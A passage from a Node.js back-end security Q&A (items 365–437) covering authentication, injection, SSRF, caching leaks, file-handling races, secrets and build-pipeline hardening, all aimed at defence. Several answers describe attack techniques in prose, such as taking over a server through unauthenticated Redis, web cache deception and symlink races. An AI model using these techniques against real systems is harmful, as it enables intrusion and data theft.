Instead of one long-lived password, a tool like HashiCorp Vault creates a new database user with a short lease (say, 1 hour) when the app asks for credentials, and deletes it when the lease ends. Each app instance gets its own user.

If credentials leak, they expire soon and they identify exactly which instance leaked them. Cloud options like IAM database authentication for RDS or Cloud SQL give a similar result with short-lived tokens. The app must handle renewing credentials and recreating the connection pool.

## 365: How do you use cloud IAM roles instead of static keys in a Node app?

- On AWS: use IAM roles for EC2/ECS tasks, or IRSA/EKS Pod Identity for Kubernetes. The AWS SDK v3 finds credentials automatically through its default provider chain.
- On GCP: Workload Identity. On Azure: Managed Identities.
- In CI: GitHub Actions OIDC with `aws-actions/configure-aws-credentials` and a role that trusts only your repo and branch.

The credentials are short-lived and rotated automatically, and there's no access key to leak in env vars or code.

## 366: What is the risk of an overly permissive OIDC trust policy in CI?

When you let GitHub Actions assume a cloud role through OIDC, the role's trust policy decides which workflows may use it. If it only checks the audience and not the `sub` claim (repo, branch, environment), then any repository on GitHub, including an attacker's, might be able to assume your role.

Always restrict `sub` to your exact repo and, for deploy roles, to a protected branch or environment, like `repo:acme/api:environment:production`.

## 367: How do you design secure file upload processing at scale?

1. The client asks the API for a pre-signed upload URL. The API checks permissions and sets limits (size, content type) in the signed policy.
2. The client uploads directly to a quarantine bucket.
3. An event triggers a worker that checks the real type, scans for malware, strips metadata, re-encodes images, and moves the file to the clean bucket.
4. The database marks the file as ready only after processing.
5. Downloads use short-lived signed URLs from a separate domain, after a permission check.

Large files never go through your Node API, and processing is isolated from the main app.

## 368: How do you protect image processing from parser exploits?

Image libraries (libvips in `sharp`, ImageMagick, libpng, libwebp) are written in C and have had serious memory bugs, like the libwebp heap overflow CVE-2023-4863. Untrusted images hit that code directly.

- Keep `sharp` and the OS libraries updated.
- Limit dimensions and pixel count (`limitInputPixels`) and file size.
- Allow only the formats you need.
- Run processing in a separate worker or container with no secrets and no network access.
- Avoid ImageMagick with untrusted input, or lock down its `policy.xml`.

## 369: How do you secure a multi-step flow like checkout or MFA login?

Keep the flow state on the server. Don't trust the client to say which step it's on.

- Store a server-side record of the flow (session or database) with each completed step and timestamps.
- Every step checks that the previous steps are done for this exact flow, for this user.
- After password but before MFA, give a limited "pending MFA" session that can only call the MFA endpoint, not a full session.
- Recalculate prices and totals on the server at the final step.
- Expire unfinished flows.

## 370: How do you protect against credential stuffing at scale?

Credential stuffing uses huge lists of leaked username/password pairs from many IPs.

- Bot detection at the edge (Cloudflare, AWS WAF Bot Control, Turnstile challenges for suspicious traffic).
- Rate limits per account, per IP, per ASN, and global failure rate alerts.
- Breached password checks at signup and login, and forced reset for matched accounts.
- MFA and passkeys, which make stolen passwords useless.
- Device fingerprinting and risk-based challenges for new devices.
- Monitoring of login success rate. A sudden drop in success rate with a rise in attempts is a typical sign.

## 371: How would you implement risk-based authentication?

Compute a risk score at login from signals: new device or browser, new country or ASN, impossible travel, known bad IP (Tor, data center, recently abusive), unusual time, many recent failures, breached password.

- Low risk: let the user in.
- Medium risk: require MFA or email confirmation.
- High risk: block and notify.

Store device identifiers (a long-lived random cookie) to recognize returning devices. Keep the rules simple and explainable, and log decisions so you can tune them.

## 372: How do you think about security vs usability trade-offs?

Security controls that annoy users get bypassed: shared accounts, passwords on sticky notes, disabled MFA. Good security makes the safe way the easy way.

Examples: passkeys are both safer and easier than passwords, risk-based MFA asks only when needed, long sessions for low-risk actions with step-up for sensitive ones, and clear error messages that don't leak data. Ask what threat a control stops and whether a less painful control would stop it too.

## 373: How do you secure a public API used by third-party developers?

- OAuth 2 for user-delegated access, with scopes, consent screens and PKCE. API keys or client credentials for server-to-server.
- Per-client rate limits and quotas, with clear `429` responses.
- Strict input validation and versioning.
- Don't expose internal IDs or fields by accident. Have a documented public schema.
- Allow key rotation and revocation, show last-used info, and support IP allowlists for sensitive clients.
- Monitor for abuse per client, and have a way to suspend a client quickly.

## 374: How do you handle security for long-running background jobs and queues?

- Jobs run with the permissions of the system, so include the acting user and tenant in the job payload and check permissions when the job runs, not only when it's queued.
- Validate job payloads like HTTP input. Anyone who can write to the queue can send any data.
- Protect the queue itself (Redis, RabbitMQ, SQS) with auth, TLS and network rules.
- Make jobs idempotent, so retries and duplicates are safe.
- Don't put secrets in job payloads, because queues and dashboards may show them.

## 375: What risks come with exposing Redis or MongoDB without auth?

Unprotected Redis and MongoDB instances on the internet get found by scanners in minutes. Attackers have wiped and ransomed thousands of MongoDB databases, and with Redis they can write files (like SSH keys or cron jobs) through `CONFIG SET dir` and `SAVE`, which leads to server takeover.

Always enable authentication (Redis ACLs, MongoDB users), use TLS, bind to private interfaces, firewall the ports, and rename or disable dangerous Redis commands where possible.

## 376: How do you prevent NoSQL injection in aggregation pipelines?

User input can reach `$match`, `$lookup` or even `$function`/`$accumulator` stages. If you build pipelines from request objects, an attacker can add operators or whole stages.

- Never put raw request objects into a pipeline. Build stages from validated primitive values.
- Avoid `$where`, `$function` and `$accumulator` (they run JavaScript) and disable server-side JavaScript in MongoDB (`security.javascriptEnabled: false`) if you don't need it.
- Use `$eq` explicitly for user values: `{ email: { $eq: email } }`.
- Validate allowed field names for sorting and grouping against an allowlist.

## 377: How do you build a safe search or filter API with flexible conditions?

Don't accept raw query objects (Mongo filters or SQL fragments) from clients. Define your own small filter language and translate it:

```js
const Filter = z.object({
  field: z.enum(["status", "createdAt", "price"]),
  op: z.enum(["eq", "gt", "lt", "in"]),
  value: z.union([z.string(), z.number(), z.array(z.string()).max(50)]),
});

const ops = { eq: "$eq", gt: "$gt", lt: "$lt", in: "$in" };

function toMongo(filters) {
  return Object.fromEntries(
    filters.map((f) => [f.field, { [ops[f.op]]: f.value }]),
  );
}
```

Then always add the user's tenant filter on top, and limit the number of conditions.

## 378: How do you prevent SQL injection when using JSON or array operators in PostgreSQL?

Pass JSON and arrays as parameters too, not as text:

```js
await pool.query("SELECT * FROM products WHERE tags && $1::text[]", [tags]);
await pool.query("SELECT * FROM events WHERE data @> $1::jsonb", [
  JSON.stringify({ type }),
]);
```

Avoid building JSON path strings with user input. If you need dynamic paths, validate each segment against an allowlist. Query builders like Knex and Drizzle have helpers for JSON operators, but their `raw` functions still need bound parameters.

## 379: What are second-order injection attacks?

The payload is stored safely first (for example, a username saved with a parameterized query), then later used unsafely somewhere else: in a report job that builds SQL with string concatenation, a shell script that uses the filename, or an admin page that renders it without encoding.

The lesson is that data from your own database isn't automatically safe. Every place that uses data in a query, command or HTML must handle it safely, no matter where it came from.

## 380: How do you secure server-to-server calls inside a VPC?

"It's internal" isn't enough, because SSRF bugs, compromised pods and misconfigured networks happen.

- Authenticate every call (mTLS through a mesh, or signed service tokens with audience checks).
- Authorize per service ("only billing may call payments.refund").
- Encrypt traffic, even inside the network.
- Use network policies to allow only expected connections.
- Log calls between services, so you can trace abuse.

This is basically the zero trust idea applied to service traffic.

## 381: What is zero trust in practical terms for a Node back end?

Zero trust means no request is trusted because of where it comes from (inside the office network, inside the VPC). Every request is authenticated and authorized based on identity, device and context.

In practice: SSO with MFA for staff tools behind an identity-aware proxy instead of a VPN, mTLS or service tokens between services, short-lived credentials everywhere, least privilege, and continuous logging and monitoring.

## 382: How do you protect a Node API behind a CDN or load balancer from direct access?

If attackers can reach your origin directly, they bypass the WAF, rate limits and DDoS protection at the edge.

- Allow inbound traffic only from the CDN's IP ranges or through a private link.
- Use authenticated origin pulls (mTLS between CDN and origin) or a secret header that the CDN adds and the origin checks.
- Don't leak the origin IP in DNS history, emails or error pages.
- Use something like Cloudflare Tunnel so the origin has no public inbound port at all.

## 383: How should a Node service handle a flood of requests it can't serve?

- At the edge: DDoS protection and rate limiting.
- In the service: set a max number of concurrent requests and queue length, and return `503` with `Retry-After` when they're exceeded.
- Fail fast on dependency timeouts (circuit breakers), so slow downstream services don't pile up requests in memory.
- Prioritize important traffic (health checks, logged-in users, payments) over less important traffic.
- Autoscale, but with limits, so attackers can't drive your cloud bill up without end.

## 384: How do you secure health check and metrics endpoints?

- `/healthz` should return minimal info (`ok`) without dependency details, or run on a separate internal port.
- `/metrics` (Prometheus) can reveal route names, error rates, versions and business numbers. Expose it only on an internal port or network, or require auth.
- Don't let health checks run heavy queries that an attacker could trigger repeatedly.
- Exclude these routes from public routing at the ingress.

## 385: What logging and monitoring would let you detect an attack early?

- Alerts on spikes in `401`, `403`, `429` and `5xx` responses per route and per IP or ASN.
- Alerts on login failure rate, password reset volume, MFA failures, and new admin accounts.
- Logs of permission denials and validation failures on sensitive endpoints.
- Unusual outgoing traffic from app containers (egress monitoring).
- Cloud audit logs (CloudTrail) for IAM changes and unusual API calls.
- New dependencies or images deployed outside the normal pipeline.

Send everything to a central system (SIEM) and test that alerts actually reach someone.

## 386: How do you make audit logs tamper-evident?

- Send them to a separate system the app can only append to (WORM storage like S3 Object Lock, a managed audit service, or a separate log account).
- Chain entries: each record includes a hash of the previous record, so deleting or changing one breaks the chain.
- Periodically sign or anchor the latest hash somewhere else.
- Limit who can read and delete, and log access to the logs too.

```js
const entry = { ...event, prevHash, ts: new Date().toISOString() };
entry.hash = createHash("sha256").update(JSON.stringify(entry)).digest("hex");
```

## 387: How do privacy laws like GDPR affect how you build a Node back end?

- Collect only the personal data you need (data minimization), and know where it's stored, including logs, caches, backups and third parties.
- Support data export and deletion requests. Deletion must also reach search indexes, caches and analytics.
- Protect personal data with access control, encryption and pseudonymization where possible.
- Set retention periods and delete old data automatically.
- Record processing activities and use data processing agreements with vendors.
- Report breaches within the required time (72 hours to the authority under GDPR).

## 388: How do you handle user data deletion in a system with backups and logs?

- Delete or anonymize in the primary database right away.
- Remove from derived stores: search indexes, caches, data warehouses, analytics, and third-party processors (through their APIs).
- Logs: avoid personal data in logs in the first place, or use short retention so they age out.
- Backups: usually you can't edit them, so document a retention period and make sure restored backups re-apply deletions (keep a list of deleted user IDs to delete again after a restore).
- "Crypto-shredding": encrypt each user's data with their own key and delete the key.

## 389: What is crypto-shredding?

Each user's (or tenant's) sensitive data is encrypted with its own key. To delete the data, you delete the key. All copies of the encrypted data, including backups and replicas, become unreadable without having to find and erase each one.

It requires per-user key management (often envelope encryption with a KMS), and the data must actually be encrypted everywhere it's stored, including derived copies.

## 390: How do you secure a GraphQL federation or gateway setup?

- The gateway authenticates the user and passes a signed identity (JWT) to subgraphs. Subgraphs verify it and do their own authorization.
- Subgraphs must not be reachable directly from the internet. Otherwise attackers skip the gateway's checks.
- Disable introspection on subgraphs, and protect any `_entities` resolver, which can fetch any entity by key.
- Apply cost limits at the gateway, with timeouts per subgraph.
- Use persisted queries for first-party clients.

## 391: How do you prevent abuse of the GraphQL _entities query in federation?

In Apollo Federation, subgraphs expose `_entities(representations: [...])`, which loads objects by key for the router. If a subgraph is reachable directly, an attacker can call it with arbitrary keys and skip authorization that was only done in other resolvers.

Make sure entity resolvers (`__resolveReference`) check permissions themselves, restrict subgraphs to calls from the router (network rules plus a shared secret or mTLS), and never assume "only the gateway calls this".

## 392: How would you secure Server-Sent Events or long polling endpoints?

- Authenticate the connection (cookie session or a short-lived token). `EventSource` can't set custom headers, so cookies or a ticket in the URL are common. If you use a URL ticket, make it single-use and short-lived.
- Check authorization for each event you send, not only at connect time.
- Limit concurrent connections per user and in total, since each one holds resources.
- Close connections when the session expires or is revoked.
- Set CORS and `Origin` checks like any other endpoint.

## 393: How do you prevent cross-site WebSocket hijacking in depth?

- Check the `Origin` header against an exact allowlist during the upgrade.
- Don't rely only on cookies. Use a short-lived, single-use connection ticket obtained through a normal authenticated API call (which CORS and CSRF defenses protect), and pass it in the first message or the URL.
- Use `SameSite` cookies.
- Check authorization for each message.

Origin checks alone don't stop non-browser clients, but those can't use the victim's cookies anyway, which is the attack this is about.

## 394: How do you secure AI or LLM features in a Node back end?

- Treat model output as untrusted input. Don't pass it to `eval`, SQL, shell or HTML without the usual protections.
- Prompt injection: content from users, web pages or documents can contain instructions. Limit what tools the model can call and what data they can reach, and require confirmation for risky actions.
- Enforce authorization in the tools themselves, using the end user's identity, not a powerful service account.
- Don't send secrets or unnecessary personal data in prompts. Check the vendor's data retention.
- Rate limit and set spending limits, because each call costs money.
- Log prompts and tool calls for abuse investigation, with redaction.

## 395: How do you secure an MCP server written in Node.js?

An MCP server exposes tools that an AI client can call, so it's an API with an unusual caller.

- For remote servers, require proper authentication (the MCP spec uses OAuth 2.1) and validate tokens for your server's audience. Don't pass the client's token through to other APIs.
- Validate all tool arguments with schemas.
- Apply least privilege: each tool gets only the access it needs, scoped to the user.
- Protect against prompt injection in data returned by tools.
- For local servers using HTTP, bind to localhost and check `Origin` to prevent DNS rebinding.
- Log tool calls and add rate limits.

## 396: How do you safely let users configure webhooks or integrations with URLs?

The user controls a URL your server will call, so it's SSRF by design. Combine:

- Connection-time IP checks (block private, loopback, link-local, metadata).
- An egress proxy that sends this traffic through an isolated network.
- No redirect following, or rechecking each hop.
- Short timeouts and response size limits, and don't show response bodies to the user (avoid turning it into a read oracle for internal services).
- Verify ownership of the endpoint (send a challenge it must echo back) before activating it.

## 397: How do you build a secure "import from URL" or link preview feature?

All the SSRF rules apply, plus:

- Parse HTML with a real parser, take only the metadata you need (title, description, image URL), and sanitize it before showing it.
- Don't fetch the preview image on the server unless needed. If you do, apply the same SSRF rules and limits, and re-encode the image.
- Cache results to reduce repeated fetching.
- Run the fetcher as a separate service with no access to internal systems or secrets.

## 398: How do you detect and prevent business logic abuse?

Business logic bugs don't look like attacks: normal requests in an unexpected order or amount. Examples: applying a discount after payment, negative quantities, signing up thousands of trial accounts, transferring to yourself to trigger rewards.

- Model the allowed state transitions and enforce them on the server.
- Validate ranges and signs (no negative quantities or amounts).
- Use rate limits and quotas per user for valuable actions.
- Monitor business metrics (coupon redemptions, refunds) for unusual spikes.
- Include abuse cases in design reviews and tests.

## 399: How do you secure a multi-region or multi-instance session setup?

- Use a shared, replicated session store (Redis with replication, or a database) so a session works everywhere, and revocation reaches every region.
- If you use signed tokens instead, keep them short-lived and sync revocation lists across regions.
- Encrypt traffic between regions and to the store.
- Rotate cookie signing secrets across all instances at once, supporting both old and new during the switch.
- Make sure clocks are synced (NTP), because token expiry checks depend on time.

## 400: What clock-related issues can break security?

- Servers with wrong time reject valid tokens or accept expired ones.
- TOTP codes fail if the server clock drifts.
- Signed URL and webhook timestamp checks become too strict or too loose.

Keep NTP running, allow a small skew in checks (JWT libraries have `clockTolerance`, a few seconds is enough), and use monotonic clocks (`performance.now()`, `process.hrtime.bigint()`) for timeouts and rate limit windows inside a process.

## 401: How do you safely implement "magic link" passwordless login?

- Generate a random single-use token, store its hash with a short expiry (10-15 minutes), and email the link.
- When the link is opened, don't log in on `GET` right away. Email scanners and link preview bots open links automatically and would use up or even complete the login. Show a page with a "Continue" button that sends a `POST`.
- Bind the login to the browser that asked for it if possible (a cookie set when the link was requested), or show a code to compare.
- Rate limit requests per email and IP, and use the same response for unknown emails.

## 402: How do you secure account recovery when the user has lost MFA?

Recovery is often the weakest part of an account. Options, from strong to weak:

- Backup codes created at MFA setup (stored hashed, single use).
- A second registered passkey or security key.
- Recovery through an admin in the user's organization (for business accounts).
- Identity verification by support, with a waiting period (for example 24-72 hours) and notifications to all known contact methods, so the real owner can stop it.

Never let a support agent remove MFA just because a caller knows some personal details.

## 403: What are the security risks of SAML and how do you handle them in Node?

SAML uses signed XML, and XML signature checking is famous for tricky bugs: signature wrapping attacks (the signed part isn't the part the app reads), comment injection in values, accepting unsigned assertions, and XML parser differences.

- Use a well-maintained library (like `@node-saml/node-saml`) and keep it updated. Several serious SAML library CVEs appeared in 2024 and 2025 across languages.
- Require signed assertions, check audience, recipient, `NotOnOrAfter` and `InResponseTo`.
- Pin the IdP certificate per tenant.
- Consider using a managed identity service that handles SAML for you and gives your app OIDC.

## 404: How do you protect a Node app from a compromised identity provider tenant in multi-tenant SSO?

In B2B apps, each customer may connect their own IdP. A malicious or compromised customer IdP can claim any email address.

- Tie each IdP connection to specific verified domains, and only accept users with emails in those domains (domain verification through DNS).
- Identify users by IdP connection + `sub`, not email alone.
- Never let an IdP connection for tenant A log in users of tenant B.
- Restrict privileged roles in your app from being granted automatically by IdP claims without review.

## 405: How would you design rate limiting for an API with free and paid tiers?

- Identify the client by API key or account, not just IP.
- Use a token bucket or sliding window per client, stored in Redis, with limits from the client's plan.
- Add separate limits for expensive operations and burst limits on top of per-minute limits.
- Return `429` with `Retry-After` and rate limit headers (`RateLimit-Limit`, `RateLimit-Remaining`, `RateLimit-Reset`).
- Keep a global limit to protect the system even if many clients are within their own limits.
- Rate limit at the edge for unauthenticated traffic before it reaches Node.

## 406: How does a token bucket rate limiter work and how would you implement it in Redis?

Each client has a bucket with a max capacity of tokens. Tokens refill at a fixed rate, and each request takes one. If the bucket is empty, the request is rejected. It allows short bursts but limits the average rate.

In Redis, use a Lua script so reading, refilling and taking a token happen atomically:

```lua
-- KEYS[1] = bucket key, ARGV = capacity, refill_per_sec, now_ms
local b = redis.call("HMGET", KEYS[1], "tokens", "ts")
local cap, rate, now = tonumber(ARGV[1]), tonumber(ARGV[2]), tonumber(ARGV[3])
local tokens = tonumber(b[1]) or cap
local ts = tonumber(b[2]) or now
tokens = math.min(cap, tokens + (now - ts) / 1000 * rate)
local allowed = tokens >= 1
if allowed then tokens = tokens - 1 end
redis.call("HSET", KEYS[1], "tokens", tokens, "ts", now)
redis.call("PEXPIRE", KEYS[1], math.ceil(cap / rate * 1000))
return allowed and 1 or 0
```

## 407: What's the security risk of caching authorization decisions?

Caching "user X can access Y" makes checks fast, but when permissions change (user removed from a team, account suspended), the cache keeps allowing access until it expires.

- Keep TTLs short for authorization caches.
- Invalidate on permission changes (publish an event and clear related keys).
- Never cache negative decisions forever either, or users who just got access are blocked.
- For high-risk actions, skip the cache and check fresh.

## 408: How do you prevent private data leaks through shared caches?

- Include everything that changes the response in the cache key: user, tenant, language, role. Or don't cache personalized responses in shared caches at all.
- Set `Cache-Control: private, no-store` on authenticated responses so CDNs don't store them.
- Watch out for "web cache deception": an attacker tricks a victim into visiting `/account/profile.css`, the app ignores the suffix and returns the profile, and the CDN caches it as a static file. Make the app return `404` for unknown extensions on dynamic routes, and configure the CDN to cache based on `Cache-Control`, not file extension.

## 409: How do you secure an app that uses server-side caching of rendered pages?

If the HTML contains user-specific data (name, CSRF token, CSP nonce), it must not be served to another user from cache.

- Cache only anonymous versions of pages, and load user-specific parts separately.
- A cached page with a CSP nonce reuses the same nonce for everyone, which makes the nonce predictable. Use hashes or don't cache such pages.
- Use `Vary` correctly and keep cookies out of cached responses (`Set-Cookie` on a cached response is a classic leak).

## 410: What makes JSON Web Encryption (JWE) different and when would you use it?

JWE encrypts the token payload, so only the holder of the decryption key can read the claims. A normal JWT (JWS) is only signed and readable by anyone.

Use JWE when tokens carry data the client or intermediaries shouldn't see, for example in some OIDC flows or when a token passes through untrusted systems. Often a simpler choice is an opaque reference token, a random ID the server looks up. The `jose` package supports JWE with `EncryptJWT` and `jwtDecrypt`.

## 411: When would you choose opaque tokens over JWTs?

Opaque tokens are random strings with no meaning. The resource server looks them up (in a database, cache or through token introspection, RFC 7662).

Choose them when you need instant revocation, when you don't want token contents visible, or when tokens go to third-party clients who shouldn't depend on their format. The cost is a lookup on every request, which you can cache for a short time. Many systems use opaque tokens externally and JWTs internally.

## 412: How do you protect against session puzzling or session variable overloading?

Session puzzling happens when different flows use the same session variable for different meanings. For example, the password reset flow sets `req.session.userId` after the user enters their email, and another part of the app treats `req.session.userId` as "logged in".

Use clearly separated keys per flow (`req.session.reset = { userId, verified: false }`), clear temporary flow state when done, and have one function that decides "is logged in" based on a dedicated field.

## 413: How do you handle security for feature flags and config services?

Feature flags and remote config can change app behavior at runtime, so they're a control plane.

- Restrict who can change flags, require review for security-related ones, and audit changes.
- Don't put security checks behind flags that could be flipped off by mistake.
- Evaluate flags on the server for anything security-related. Client-side flags can be changed by the user.
- Protect the SDK keys: server-side keys can often read all flag rules.

## 414: How would you secure a Node CLI tool distributed via npm?

- Publish with trusted publishing and provenance, and use 2FA.
- Keep dependencies minimal, since every user installs them.
- Don't use install scripts if possible.
- Store user credentials in the OS keychain (for example with `@napi-rs/keyring` or similar), not in plain-text config files, or at least with `0600` file permissions.
- Validate data from APIs before using it in file paths or shell commands.
- Check for updates through the registry, not by downloading and running scripts.

## 415: How do you write files securely to avoid symlink and race attacks?

- Create temp files in a private directory made with `fs.mkdtemp`, not with predictable names in `/tmp`.
- Use the `wx` flag (create, fail if exists) so you don't write through a symlink someone planted.
- Set restrictive permissions on creation (`mode: 0o600`).
- Check-then-open is racy (TOCTOU). Open the file first, then check with `fstat` on the file descriptor.

```js
import { mkdtemp, open } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

const dir = await mkdtemp(path.join(tmpdir(), "app-"));
const fh = await open(path.join(dir, "data.json"), "wx", 0o600);
await fh.writeFile(JSON.stringify(data));
await fh.close();
```

## 416: What is a TOCTOU bug in file handling?

Time-of-check to time-of-use: you check something about a file (exists, is inside allowed folder, isn't a symlink), and then use it. Between the two steps, an attacker replaces it, for example with a symlink to `/etc/passwd`.

```js
// Racy
if (!(await lstat(p)).isSymbolicLink()) await readFile(p);
```

Fixes: open once and operate on the file handle, use `O_NOFOLLOW` (`fs.constants.O_NOFOLLOW`) where supported, resolve with `realpath` and check, and avoid letting untrusted users write to directories you read from.

## 417: How do you check that a resolved path is inside a directory, including symlinks?

`path.resolve` only handles `..` in the string. It doesn't follow symlinks. Use `realpath` for the final check:

```js
import { realpath } from "node:fs/promises";
import path from "node:path";

const base = await realpath("/srv/uploads");

async function safeResolve(userPath) {
  const full = await realpath(path.resolve(base, userPath)); // throws if missing
  const rel = path.relative(base, full);
  if (rel.startsWith("..") || path.isAbsolute(rel))
    throw new Error("Outside base dir");
  return full;
}
```

Using `path.relative` avoids prefix bugs like `/srv/uploads-old` matching `/srv/uploads`. Also reject null bytes and, on Windows, check for drive letters, UNC paths and reserved device names.

## 418: Why are Windows paths tricky for path traversal checks?

Windows accepts both `\` and `/`, has drive-relative paths like `C:foo`, UNC paths like `\\server\share`, device paths like `\\.\` and `\\?\`, and reserved device names like `CON`, `NUL` and `AUX` that work in any folder. Node has had security fixes where `path.normalize` or `path.join` could produce paths that escape the intended directory on Windows.

If your app runs on Windows, use `path.win32` explicitly in checks, reject drive letters and UNC prefixes in user input, and keep Node updated. Better: never use user input as a file path.

## 419: How do you securely process archives (zip, tar) uploaded by users?

- Stream and check each entry: reject absolute paths, `..`, symlinks and hard links (unless needed and checked).
- Limit total uncompressed size, entry count, nesting depth and compression ratio.
- Extract into a fresh temp directory with the `wx` behavior, then move validated files.
- Use maintained libraries (`tar` v7 handles many of these issues, `yauzl` for zip) with their safety options on.
- Do it in an isolated worker without secrets.

## 420: How would you secure a plugin system for your Node application?

Plugins loaded with `import()` or `require()` run with full process rights. Options by trust level:

- **Trusted, first-party:** normal loading, code review, signed releases.
- **Third-party but reviewed:** a curated registry, pinned versions with integrity hashes, and the permission model for the whole process.
- **Untrusted:** run plugins out of process (separate container or isolate) and talk to them over a narrow message API with explicit capabilities, like VS Code's extension host or Figma's plugin sandbox. WebAssembly plugins (for example with the Extism framework) are another way to get strong isolation.

## 421: How do you protect a Node service from memory exhaustion attacks?

- Limit all input sizes: bodies, headers, uploads, WebSocket messages, query results.
- Stream large data instead of buffering it.
- Limit caches with a max size and eviction (`lru-cache`), so attackers can't fill memory with unique keys.
- Set container memory limits and a matching `--max-old-space-size`, so the process restarts cleanly instead of making the host swap.
- Watch for unbounded arrays or maps keyed by user input (like rate limit counters without TTL).

## 422: How can caches keyed by user input become an attack vector?

If you cache by a value the attacker controls (URL, query string, header), they can send millions of unique keys. An unbounded cache grows until the process runs out of memory, and a bounded cache gets flushed, hurting real users (cache busting).

Use bounded LRU caches, normalize and validate keys, ignore unknown query parameters in cache keys, and limit per-client request rates.

## 423: How do you safely handle large JSON payloads that are legitimately big?

- Allow big bodies only on the routes that need them.
- Stream parse instead of `JSON.parse` on the whole body, for example with `stream-json`, processing items one by one.
- Or offload parsing to a worker thread to keep the main event loop responsive.
- Validate structure as you go, and reject early.
- For uploads of data files, accept them to object storage and process them in a background job.

## 424: What is the risk of using `structuredClone` or `v8.deserialize` on untrusted data?

`structuredClone` works on values already in memory, so it's not a parsing risk by itself. But `v8.deserialize` parses the V8 serialization format, which can describe complex objects, typed arrays and shared memory. It's meant for trusted data between your own processes.

Feeding it data from users can cause crashes, huge allocations or exploitation of parser bugs. For untrusted data, use JSON or another simple format plus schema validation.

## 425: How do you limit the damage of an RCE in a Node container?

Assume an attacker gets code execution and make that as useless as possible:

- Non-root user, read-only file system, all capabilities dropped, seccomp on, no privilege escalation.
- Minimal image (distroless or hardened) with no shell, package manager or curl.
- No cloud credentials beyond what the service needs. No Kubernetes API token.
- Egress restricted to known destinations.
- Secrets scoped to that service only.
- Runtime detection (Falco, cloud runtime security) for unexpected processes or network calls.

## 426: How do distroless or hardened images help Node security?

Distroless and hardened images (Google distroless, Chainguard, Docker Hardened Images) contain only the Node runtime and needed libraries, without a shell, package manager or common utilities.

Fewer packages mean fewer CVEs to patch and fewer tools for an attacker after an RCE (no `sh`, `curl` or `apt`). The trade-off is harder debugging, which you solve with ephemeral debug containers (`kubectl debug`) or a separate debug image tag.

## 427: How do you manage secrets in Kubernetes properly?

- Kubernetes Secrets are only base64-encoded by default. Turn on encryption at rest for etcd (with a KMS provider) and restrict RBAC so few people and service accounts can read Secrets.
- Prefer an external secret store with the External Secrets Operator or the Secrets Store CSI Driver, so the source of truth is a secrets manager with audit logs and rotation.
- Mount secrets as files instead of env vars when possible, and let the app reload them.
- Don't commit Secret manifests. Use Sealed Secrets or SOPS if they must live in Git.

## 428: How do you rotate secrets without downtime in a Node service?

- Read secrets in a way that allows refresh: re-read a mounted file on change, or refetch from the secrets manager periodically.
- Support two valid secrets during rotation (old and new) for things you verify: JWT keys, cookie secrets, webhook secrets, API keys.
- For database passwords, use dual users or the manager's rotation strategy that creates the new password before revoking the old one, and recreate connection pools gracefully.
- Test rotation regularly, so you know it works during a real incident.

## 429: How would you secure a monorepo with many Node services and shared packages?

- One lockfile means one dependency update can affect every service. Review lockfile changes carefully and run full CI.
- Use CODEOWNERS so security-sensitive packages (auth, crypto, config) need review by the right team.
- Keep internal packages scoped and private, and configure the registry mapping to prevent dependency confusion.
- Build and scan each service image separately, with only its own dependencies (`pnpm deploy` or `turbo prune`).
- Limit CI secrets per service and per environment.

## 430: How do you evaluate the security of a third-party SaaS your Node app depends on?

- What data you'll send, and whether you can minimize or pseudonymize it.
- Their certifications and reports (SOC 2 Type II, ISO 27001), and their breach history.
- How they authenticate your app (scoped keys, OAuth, IP allowlists) and whether keys can be rotated.
- Where data is stored and for how long, and data processing agreements.
- What happens to your app if they're down or compromised (timeouts, fallbacks, webhook signature checks).

## 431: How would you respond to a zero-day in a widely used package before a patch exists?

1. Find out if you're affected: which services use it, and whether the vulnerable feature is reachable in your code.
2. Apply temporary mitigations: WAF rules for the exploit pattern, turning off the affected feature, input filtering, network restrictions.
3. Watch for exploitation in logs.
4. Prepare the upgrade, and apply the patch as soon as it's out, through `overrides` if needed for indirect dependencies.
5. Afterwards, check whether you were exploited before the mitigation.

The React Server Components RCE in December 2025 is a good example: many teams relied on WAF rules from their CDN for the first hours while they upgraded.

## 432: How do you secure the Node.js build pipeline end to end?

- Source: branch protection, required reviews, signed commits for sensitive repos.
- Dependencies: lockfiles, `npm ci`, install scripts off, dependency review, a delay for brand-new versions.
- CI: pinned actions, minimal permissions, no secrets for untrusted PRs, ephemeral runners, OIDC for cloud.
- Build: reproducible image builds, SBOM and provenance attestations, image signing.
- Deploy: deploy by digest, admission policies that check signatures, separate deploy credentials per environment.
- Runtime: monitoring that alerts on unexpected changes.

## 433: How do you handle security for preview environments built from pull requests?

- Don't give preview environments production secrets or production data. Use separate test credentials.
- For PRs from forks, don't build automatically with secrets.
- Put previews behind authentication (SSO), since they often have debug features and weaker settings.
- Clean them up automatically, and avoid predictable public URLs.
- Make sure preview environments can't reach production databases or internal services.

## 434: How do you prevent an attacker from abusing your app to send spam or phishing?

Features like invitations, sharing, contact forms and "send to a friend" can send emails with attacker-controlled content from your trusted domain.

- Rate limit email-sending features per user and per recipient.
- Don't let users control email content beyond a short, plain-text message. Strip links if not needed.
- Require verified accounts before they can send invites.
- Set up SPF, DKIM and DMARC so others can't spoof your domain, and monitor bounce and complaint rates.

## 435: How would you design secure multi-tenant file storage on S3?

- One bucket with tenant prefixes (`tenants/{tenantId}/...`) or a bucket per large tenant.
- The app checks tenant permissions before generating any pre-signed URL. Never accept object keys from the client without checking the prefix belongs to the user's tenant.
- Short expiry on pre-signed URLs (minutes), with the exact key and method.
- Block public access at the account level, and turn on encryption (SSE-KMS, with per-tenant keys if needed).
- Turn on access logging and versioning, and lifecycle rules for deletion.

## 436: What would you look for when reviewing someone's auth code in Node?

- Password hashing algorithm and parameters, and use of async APIs.
- Constant-time comparisons for tokens and signatures.
- Session regeneration on login and privilege change, and full invalidation on logout and password change.
- Cookie flags and prefixes.
- JWT verification with pinned algorithms, `iss`, `aud`, `exp`, and no use of `decode` for trust.
- Same errors for unknown user and wrong password, and timing equalization.
- Rate limiting on login, reset and MFA endpoints.
- Reset and verification tokens: random, hashed, single use, short-lived.
- MFA can't be skipped through other flows.

## 437: Scenario: users report being logged in as someone else. How do you investigate?

This is usually a caching or concurrency bug, not an attacker.

- Check CDN and proxy caches: are authenticated responses or `Set-Cookie` headers being cached?
- Check for module-level variables holding per-request data (for example a global `currentUser` that two concurrent requests overwrite). Use `AsyncLocalStorage` for request context instead.
- Check connection pools with session state, like Postgres `SET` commands not scoped to a transaction.
- Check session ID generation and store collisions.

Treat it as a security incident: disable affected caching right away, invalidate sessions, and find which users saw which data.

